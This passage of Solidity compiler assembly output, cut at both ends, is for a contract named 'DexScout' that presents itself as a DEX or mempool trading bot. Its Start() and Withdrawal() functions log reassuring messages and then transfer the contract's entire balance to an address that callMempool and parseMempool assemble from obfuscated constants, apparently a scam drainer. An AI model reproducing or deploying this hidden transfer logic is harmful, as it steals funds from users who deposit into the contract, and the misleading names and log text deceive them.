0xffffffffffffffff\n    /* \"#utility.yul\":7280:7286   */\n  dup2\n    /* \"#utility.yul\":7277:7307   */\n  gt\n    /* \"#utility.yul\":7274:7330   */\n  iszero\n  tag_127\n  jumpi\n    /* \"#utility.yul\":7310:7328   */\n  tag_128\n  tag_16\n  jump\t// in\ntag_128:\n    /* \"#utility.yul\":7274:7330   */\ntag_127:\n    /* \"#utility.yul\":7354:7392   */\n  tag_129\n    /* \"#utility.yul\":7386:7390   */\n  dup3\n    /* \"#utility.yul\":7380:7391   */\n  sload\n    /* \"#utility.yul\":7354:7392   */\n  tag_25\n  jump\t// in\ntag_129:\n    /* \"#utility.yul\":7439:7506   */\n  tag_130\n    /* \"#utility.yul\":7499:7505   */\n  dup3\n    /* \"#utility.yul\":7491:7497   */\n  dup3\n    /* \"#utility.yul\":7485:7489   */\n  dup6\n    /* \"#utility.yul\":7439:7506   */\n  tag_38\n  jump\t// in\ntag_130:\n    /* \"#utility.yul\":7533:7534   */\n  0x00\n    /* \"#utility.yul\":7557:7561   */\n  0x20\n    /* \"#utility.yul\":7544:7561   */\n  swap1\n  pop\n    /* \"#utility.yul\":7589:7591   */\n  0x1f\n    /* \"#utility.yul\":7581:7587   */\n  dup4\n    /* \"#utility.yul\":7578:7592   */\n  gt\n    /* \"#utility.yul\":7606:7607   */\n  0x01\n    /* \"#utility.yul\":7601:8219   */\n  dup2\n  eq\n  tag_132\n  jumpi\n    /* \"#utility.yul\":8263:8264   */\n  0x00\n    /* \"#utility.yul\":8280:8286   */\n  dup5\n    /* \"#utility.yul\":8277:8354   */\n  iszero\n  tag_133\n  jumpi\n    /* \"#utility.yul\":8329:8338   */\n  dup3\n    /* \"#utility.yul\":8324:8327   */\n  dup8\n    /* \"#utility.yul\":8320:8339   */\n  add\n    /* \"#utility.yul\":8314:8340   */\n  mload\n    /* \"#utility.yul\":8305:8340   */\n  swap1\n  pop\n    /* \"#utility.yul\":8277:8354   */\ntag_133:\n    /* \"#utility.yul\":8380:8447   */\n  tag_134\n    /* \"#utility.yul\":8440:8446   */\n  dup6\n    /* \"#utility.yul\":8433:8438   */\n  dup3\n    /* \"#utility.yul\":8380:8447   */\n  tag_41\n  jump\t// in\ntag_134:\n    /* \"#utility.yul\":8374:8378   */\n  dup7\n    /* \"#utility.yul\":8367:8448   */\n  sstore\n    /* \"#utility.yul\":8236:8458   */\n  pop\n    /* \"#utility.yul\":7571:8458   */\n  jump(tag_131)\n    /* \"#utility.yul\":7601:8219   */\ntag_132:\n    /* \"#utility.yul\":7653:7657   */\n  0x1f\n    /* \"#utility.yul\":7649:7658   */\n  not\n    /* \"#utility.yul\":7641:7647   */\n  dup5\n    /* \"#utility.yul\":7637:7659   */\n  and\n    /* \"#utility.yul\":7687:7724   */\n  tag_135\n    /* \"#utility.yul\":7719:7723   */\n  dup7\n    /* \"#utility.yul\":7687:7724   */\n  tag_26\n  jump\t// in\ntag_135:\n    /* \"#utility.yul\":7746:7747   */\n  0x00\n    /* \"#utility.yul\":7760:7968   */\ntag_136:\n    /* \"#utility.yul\":7774:7781   */\n  dup3\n    /* \"#utility.yul\":7771:7772   */\n  dup2\n    /* \"#utility.yul\":7768:7782   */\n  lt\n    /* \"#utility.yul\":7760:7968   */\n  iszero\n  tag_138\n  jumpi\n    /* \"#utility.yul\":7853:7862   */\n  dup5\n    /* \"#utility.yul\":7848:7851   */\n  dup10\n    /* \"#utility.yul\":7844:7863   */\n  add\n    /* \"#utility.yul\":7838:7864   */\n  mload\n    /* \"#utility.yul\":7830:7836   */\n  dup3\n    /* \"#utility.yul\":7823:7865   */\n  sstore\n    /* \"#utility.yul\":7904:7905   */\n  0x01\n    /* \"#utility.yul\":7896:7902   */\n  dup3\n    /* \"#utility.yul\":7892:7906   */\n  add\n    /* \"#utility.yul\":7882:7906   */\n  swap2\n  pop\n    /* \"#utility.yul\":7951:7953   */\n  0x20\n    /* \"#utility.yul\":7940:7949   */\n  dup6\n    /* \"#utility.yul\":7936:7954   */\n  add\n    /* \"#utility.yul\":7923:7954   */\n  swap5\n  pop\n    /* \"#utility.yul\":7797:7801   */\n  0x20\n    /* \"#utility.yul\":7794:7795   */\n  dup2\n    /* \"#utility.yul\":7790:7802   */\n  add\n    /* \"#utility.yul\":7785:7802   */\n  swap1\n  pop\n    /* \"#utility.yul\":7760:7968   */\n  jump(tag_136)\ntag_138:\n    /* \"#utility.yul\":7996:8002   */\n  dup7\n    /* \"#utility.yul\":7987:7994   */\n  dup4\n    /* \"#utility.yul\":7984:8003   */\n  lt\n    /* \"#utility.yul\":7981:8160   */\n  iszero\n  tag_139\n  jumpi\n    /* \"#utility.yul\":8054:8063   */\n  dup5\n    /* \"#utility.yul\":8049:8052   */\n  dup10\n    /* \"#utility.yul\":8045:8064   */\n  add\n    /* \"#utility.yul\":8039:8065   */\n  mload\n    /* \"#utility.yul\":8097:8145   */\n  tag_140\n    /* \"#utility.yul\":8139:8143   */\n  0x1f\n    /* \"#utility.yul\":8131:8137   */\n  dup10\n    /* \"#utility.yul\":8127:8144   */\n  and\n    /* \"#utility.yul\":8116:8125   */\n  dup3\n    /* \"#utility.yul\":8097:8145   */\n  tag_40\n  jump\t// in\ntag_140:\n    /* \"#utility.yul\":8089:8095   */\n  dup4\n    /* \"#utility.yul\":8082:8146   */\n  sstore\n    /* \"#utility.yul\":8004:8160   */\n  pop\n    /* \"#utility.yul\":7981:8160   */\ntag_139:\n    /* \"#utility.yul\":8206:8207   */\n  0x01\n    /* \"#utility.yul\":8202:8203   */\n  0x02\n    /* \"#utility.yul\":8194:8200   */\n  dup9\n    /* \"#utility.yul\":8190:8204   */\n  mul\n    /* \"#utility.yul\":8186:8208   */\n  add\n    /* \"#utility.yul\":8180:8184   */\n  dup9\n    /* \"#utility.yul\":8173:8209   */\n  sstore\n    /* \"#utility.yul\":7608:8219   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":7571:8458   */\ntag_131:\n  pop\n    /* \"#utility.yul\":7161:8464   */\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":7069:8464   */\n  pop\n  pop\n  jump\t// out\n    /* \"dexscout.sol\":682:16057  contract DexScout {... */\ntag_9:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"dexscout.sol\":682:16057  contract DexScout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":1504:1693  function Start() public payable {... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"dexscout.sol\":14122:14309  function Withdrawal() public payable {... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"dexscout.sol\":11922:12006  function Stop() public payable {... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"dexscout.sol\":1504:1693  function Start() public payable {... */\n    tag_9:\n        /* \"dexscout.sol\":1551:1619  Log(\"Running DexScout action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_15\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":1637:1653  _callDexAction() */\n      tag_17\n        /* \"dexscout.sol\":1637:1651  _callDexAction */\n      tag_18\n        /* \"dexscout.sol\":1637:1653  _callDexAction() */\n      jump\t// in\n    tag_17:\n        /* \"dexscout.sol\":1629:1663  payable(_callDexAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":1629:1686  payable(_callDexAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":1664:1685  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":1629:1686  payable(_callDexAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n        /* \"dexscout.sol\":1504:1693  function Start() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":14122:14309  function Withdrawal() public payable {... */\n    tag_11:\n        /* \"dexscout.sol\":14174:14232  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_22\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":14250:14269  WithdrawalProfits() */\n      tag_24\n        /* \"dexscout.sol\":14250:14267  WithdrawalProfits */\n      tag_25\n        /* \"dexscout.sol\":14250:14269  WithdrawalProfits() */\n      jump\t// in\n    tag_24:\n        /* \"dexscout.sol\":14242:14279  payable(WithdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"dexscout.sol\":14242:14302  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"dexscout.sol\":14280:14301  address(this).balance */\n      selfbalance\n        /* \"dexscout.sol\":14242:14302  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n        /* \"dexscout.sol\":14122:14309  function Withdrawal() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":11922:12006  function Stop() public payable {... */\n    tag_13:\n        /* \"dexscout.sol\":11968:11999  Log(\"Stopping contract bot...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_29\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"dexscout.sol\":11922:12006  function Stop() public payable {... */\n      jump\t// out\n        /* \"dexscout.sol\":12520:12629  function _callDexAction() internal pure returns (address) {... */\n    tag_18:\n        /* \"dexscout.sol\":12569:12576  address */\n      0x00\n        /* \"dexscout.sol\":12595:12622  parseMempool(callMempool()) */\n      tag_32\n        /* \"dexscout.sol\":12608:12621  callMempool() */\n      tag_33\n        /* \"dexscout.sol\":12608:12619  callMempool */\n      tag_34\n        /* \"dexscout.sol\":12608:12621  callMempool() */\n      jump\t// in\n    tag_33:\n        /* \"dexscout.sol\":12595:12607  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":12595:12622  parseMempool(callMempool()) */\n      jump\t// in\n    tag_32:\n        /* \"dexscout.sol\":12588:12622  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":12520:12629  function _callDexAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":14314:14426  function WithdrawalProfits() internal pure returns (address) {... */\n    tag_25:\n        /* \"dexscout.sol\":14366:14373  address */\n      0x00\n        /* \"dexscout.sol\":14392:14419  parseMempool(callMempool()) */\n      tag_37\n        /* \"dexscout.sol\":14405:14418  callMempool() */\n      tag_38\n        /* \"dexscout.sol\":14405:14416  callMempool */\n      tag_34\n        /* \"dexscout.sol\":14405:14418  callMempool() */\n      jump\t// in\n    tag_38:\n        /* \"dexscout.sol\":14392:14404  parseMempool */\n      tag_35\n        /* \"dexscout.sol\":14392:14419  parseMempool(callMempool()) */\n      jump\t// in\n    tag_37:\n        /* \"dexscout.sol\":14385:14419  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14314:14426  function WithdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10602:11584  function callMempool() internal pure returns (string memory) {... */\n    tag_34:\n        /* \"dexscout.sol\":10648:10661  string memory */\n      0x60\n        /* \"dexscout.sol\":10673:10698  uint256 calculateGasNeeds */\n      0x00\n        /* \"dexscout.sol\":10701:10721  _calculateGasNeeds() */\n      tag_40\n        /* \"dexscout.sol\":10701:10719  _calculateGasNeeds */\n      tag_41\n        /* \"dexscout.sol\":10701:10721  _calculateGasNeeds() */\n      jump\t// in\n    tag_40:\n        /* \"dexscout.sol\":10673:10721  uint256 calculateGasNeeds = _calculateGasNeeds() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10731:10753  uint256 _memPoolLength */\n      0x00\n        /* \"dexscout.sol\":10756:10763  7342143 */\n      0x70083f\n        /* \"dexscout.sol\":10731:10763  uint256 _memPoolLength = 7342143 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10795:10815  uint256 _memPoolSize */\n      0x00\n        /* \"dexscout.sol\":10818:10828  3853786515 */\n      0xe5b41d93\n        /* \"dexscout.sol\":10795:10828  uint256 _memPoolSize = 3853786515 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10860:10882  uint256 _memPoolHeight */\n      0x00\n        /* \"dexscout.sol\":10885:10903  getMemPoolHeight() */\n      tag_42\n        /* \"dexscout.sol\":10885:10901  getMemPoolHeight */\n      tag_43\n        /* \"dexscout.sol\":10885:10903  getMemPoolHeight() */\n      jump\t// in\n    tag_42:\n        /* \"dexscout.sol\":10860:10903  uint256 _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10913:10934  uint256 _memPoolDepth */\n      0x00\n        /* \"dexscout.sol\":10937:10954  getMemPoolDepth() */\n      tag_44\n        /* \"dexscout.sol\":10937:10952  getMemPoolDepth */\n      tag_45\n        /* \"dexscout.sol\":10937:10954  getMemPoolDepth() */\n      jump\t// in\n    tag_44:\n        /* \"dexscout.sol\":10913:10954  uint256 _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"dexscout.sol\":10965:10993  string memory _memPoolOffset */\n      0x00\n        /* \"dexscout.sol\":10996:11044  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_46\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11009:11043  checkLiquidity(getMemPoolOffset()) */\n      tag_47\n        /* \"dexscout.sol\":11024:11042  getMemPoolOffset() */\n      tag_48\n        /* \"dexscout.sol\":11024:11040  getMemPoolOffset */\n      tag_49\n        /* \"dexscout.sol\":11024:11042  getMemPoolOffset() */\n      jump\t// in\n    tag_48:\n        /* \"dexscout.sol\":11009:11023  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11009:11043  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_47:\n        /* \"dexscout.sol\":10996:11003  mempool */\n      tag_51\n        /* \"dexscout.sol\":10996:11044  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_46:\n        /* \"dexscout.sol\":10965:11044  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11054:11077  string memory _memPool1 */\n      0x00\n        /* \"dexscout.sol\":11080:11138  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      tag_52\n        /* \"dexscout.sol\":11088:11102  _memPoolOffset */\n      dup3\n        /* \"dexscout.sol\":11104:11137  checkLiquidity(calculateGasNeeds) */\n      tag_53\n        /* \"dexscout.sol\":11119:11136  calculateGasNeeds */\n      dup10\n        /* \"dexscout.sol\":11104:11118  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11104:11137  checkLiquidity(calculateGasNeeds) */\n      jump\t// in\n    tag_53:\n        /* \"dexscout.sol\":11080:11087  mempool */\n      tag_51\n        /* \"dexscout.sol\":11080:11138  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      jump\t// in\n    tag_52:\n        /* \"dexscout.sol\":11054:11138  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11148:11171  string memory _memPool2 */\n      0x00\n        /* \"dexscout.sol\":11174:11243  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_54\n        /* \"dexscout.sol\":11182:11212  checkLiquidity(_memPoolLength) */\n      tag_55\n        /* \"dexscout.sol\":11197:11211  _memPoolLength */\n      dup9\n        /* \"dexscout.sol\":11182:11196  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11182:11212  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_55:\n        /* \"dexscout.sol\":11214:11242  checkLiquidity(_memPoolSize) */\n      tag_56\n        /* \"dexscout.sol\":11229:11241  _memPoolSize */\n      dup9\n        /* \"dexscout.sol\":11214:11228  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11214:11242  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_56:\n        /* \"dexscout.sol\":11174:11181  mempool */\n      tag_51\n        /* \"dexscout.sol\":11174:11243  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_54:\n        /* \"dexscout.sol\":11148:11243  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11253:11276  string memory _memPool3 */\n      0x00\n        /* \"dexscout.sol\":11279:11309  checkLiquidity(_memPoolHeight) */\n      tag_57\n        /* \"dexscout.sol\":11294:11308  _memPoolHeight */\n      dup7\n        /* \"dexscout.sol\":11279:11293  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11279:11309  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_57:\n        /* \"dexscout.sol\":11253:11309  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11319:11342  string memory _memPool4 */\n      0x00\n        /* \"dexscout.sol\":11345:11374  checkLiquidity(_memPoolDepth) */\n      tag_58\n        /* \"dexscout.sol\":11360:11373  _memPoolDepth */\n      dup7\n        /* \"dexscout.sol\":11345:11359  checkLiquidity */\n      tag_50\n        /* \"dexscout.sol\":11345:11374  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_58:\n        /* \"dexscout.sol\":11319:11374  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11384:11410  string memory _allMempools */\n      0x00\n        /* \"dexscout.sol\":11413:11482  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_59\n        /* \"dexscout.sol\":11421:11450  mempool(_memPool1, _memPool2) */\n      tag_60\n        /* \"dexscout.sol\":11429:11438  _memPool1 */\n      dup7\n        /* \"dexscout.sol\":11440:11449  _memPool2 */\n      dup7\n        /* \"dexscout.sol\":11421:11428  mempool */\n      tag_51\n        /* \"dexscout.sol\":11421:11450  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_60:\n        /* \"dexscout.sol\":11452:11481  mempool(_memPool3, _memPool4) */\n      tag_61\n        /* \"dexscout.sol\":11460:11469  _memPool3 */\n      dup6\n        /* \"dexscout.sol\":11471:11480  _memPool4 */\n      dup6\n        /* \"dexscout.sol\":11452:11459  mempool */\n      tag_51\n        /* \"dexscout.sol\":11452:11481  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_61:\n        /* \"dexscout.sol\":11413:11420  mempool */\n      tag_51\n        /* \"dexscout.sol\":11413:11482  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_59:\n        /* \"dexscout.sol\":11384:11482  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11492:11518  string memory _fullMempool */\n      0x00\n        /* \"dexscout.sol\":11521:11547  mempool(\"0\", _allMempools) */\n      tag_62\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"dexscout.sol\":11534:11546  _allMempools */\n      dup4\n        /* \"dexscout.sol\":11521:11528  mempool */\n      tag_51\n        /* \"dexscout.sol\":11521:11547  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_62:\n        /* \"dexscout.sol\":11492:11547  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"dexscout.sol\":11565:11577  _fullMempool */\n      dup1\n        /* \"dexscout.sol\":11558:11577  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":10602:11584  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":7224:8139  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_35:\n        /* \"dexscout.sol\":7287:7302  address _parsed */\n      0x00\n        /* \"dexscout.sol\":7314:7330  bytes memory tmp */\n      dup1\n        /* \"dexscout.sol\":7339:7341  _a */\n      dup3\n        /* \"dexscout.sol\":7314:7342  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"dexscout.sol\":7352:7365  uint160 iaddr */\n      0x00\n        /* \"dexscout.sol\":7379:7389  uint160 b1 */\n      dup1\n        /* \"dexscout.sol\":7399:7409  uint160 b2 */\n      dup1\n        /* \"dexscout.sol\":7425:7434  uint256 i */\n      0x00\n        /* \"dexscout.sol\":7437:7438  2 */\n      0x02\n        /* \"dexscout.sol\":7425:7438  uint256 i = 2 */\n      swap1\n      pop\n        /* \"dexscout.sol\":7420:8102  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_64:\n        /* \"dexscout.sol\":7444:7454  2 + 2 * 20 */\n      0x2a\n        /* \"dexscout.sol\":7440:7441  i */\n      dup2\n        /* \"dexscout.sol\":7440:7454  i < 2 + 2 * 20 */\n      lt\n        /* \"dexscout.sol\":7420:8102  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_65\n      jumpi\n        /* \"dexscout.sol\":7487:7490  256 */\n      0x0100\n        /* \"dexscout.sol\":7478:7490  iaddr *= 256 */\n      dup5\n      tag_67\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_67:\n      swap4\n      pop\n        /* \"dexscout.sol\":7523:7526  tmp */\n      dup5\n        /* \"dexscout.sol\":7527:7528  i */\n      dup2\n        /* \"dexscout.sol\":7523:7529  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_69\n      jumpi\n      tag_70\n      tag_71\n      jump\t// in\n    tag_70:\n    tag_69:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7517:7530  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7509:7531  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7504:7531  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"dexscout.sol\":7564:7567  tmp */\n      dup5\n        /* \"dexscout.sol\":7572:7573  1 */\n      0x01\n        /* \"dexscout.sol\":7568:7569  i */\n      dup3\n        /* \"dexscout.sol\":7568:7573  i + 1 */\n      tag_72\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_72:\n        /* \"dexscout.sol\":7564:7574  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_74\n      jumpi\n      tag_75\n      tag_71\n      jump\t// in\n    tag_75:\n    tag_74:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":7558:7575  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":7550:7576  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"dexscout.sol\":7545:7576  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"dexscout.sol\":7601:7603  97 */\n      0x61\n        /* \"dexscout.sol\":7595:7597  b1 */\n      dup4\n        /* \"dexscout.sol\":7595:7603  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7594:7619  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_76\n      jumpi\n      pop\n        /* \"dexscout.sol\":7615:7618  102 */\n      0x66\n        /* \"dexscout.sol\":7609:7611  b1 */\n      dup4\n        /* \"dexscout.sol\":7609:7618  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7594:7619  (b1 >= 97) && (b1 <= 102) */\n    tag_76:\n        /* \"dexscout.sol\":7590:7816  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_77\n      jumpi\n        /* \"dexscout.sol\":7645:7647  87 */\n      0x57\n        /* \"dexscout.sol\":7639:7647  b1 -= 87 */\n      dup4\n      tag_78\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_78:\n      swap3\n      pop\n        /* \"dexscout.sol\":7590:7816  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_80)\n    tag_77:\n        /* \"dexscout.sol\":7679:7681  65 */\n      0x41\n        /* \"dexscout.sol\":7673:7675  b1 */\n      dup4\n        /* \"dexscout.sol\":7673:7681  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7672:7696  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_81\n      jumpi\n      pop\n        /* \"dexscout.sol\":7693:7695  70 */\n      0x46\n        /* \"dexscout.sol\":7687:7689  b1 */\n      dup4\n        /* \"dexscout.sol\":7687:7695  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7672:7696  (b1 >= 65) && (b1 <= 70) */\n    tag_81:\n        /* \"dexscout.sol\":7668:7816  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_82\n      jumpi\n        /* \"dexscout.sol\":7722:7724  55 */\n      0x37\n        /* \"dexscout.sol\":7716:7724  b1 -= 55 */\n      dup4\n      tag_83\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_83:\n      swap3\n      pop\n        /* \"dexscout.sol\":7668:7816  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_84)\n    tag_82:\n        /* \"dexscout.sol\":7756:7758  48 */\n      0x30\n        /* \"dexscout.sol\":7750:7752  b1 */\n      dup4\n        /* \"dexscout.sol\":7750:7758  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7749:7773  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_85\n      jumpi\n      pop\n        /* \"dexscout.sol\":7770:7772  57 */\n      0x39\n        /* \"dexscout.sol\":7764:7766  b1 */\n      dup4\n        /* \"dexscout.sol\":7764:7772  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7749:7773  (b1 >= 48) && (b1 <= 57) */\n    tag_85:\n        /* \"dexscout.sol\":7745:7816  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_86\n      jumpi\n        /* \"dexscout.sol\":7799:7801  48 */\n      0x30\n        /* \"dexscout.sol\":7793:7801  b1 -= 48 */\n      dup4\n      tag_87\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_87:\n      swap3\n      pop\n        /* \"dexscout.sol\":7745:7816  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_86:\n        /* \"dexscout.sol\":7668:7816  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_84:\n        /* \"dexscout.sol\":7590:7816  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_80:\n        /* \"dexscout.sol\":7840:7842  97 */\n      0x61\n        /* \"dexscout.sol\":7834:7836  b2 */\n      dup3\n        /* \"dexscout.sol\":7834:7842  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7833:7858  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"dexscout.sol\":7854:7857  102 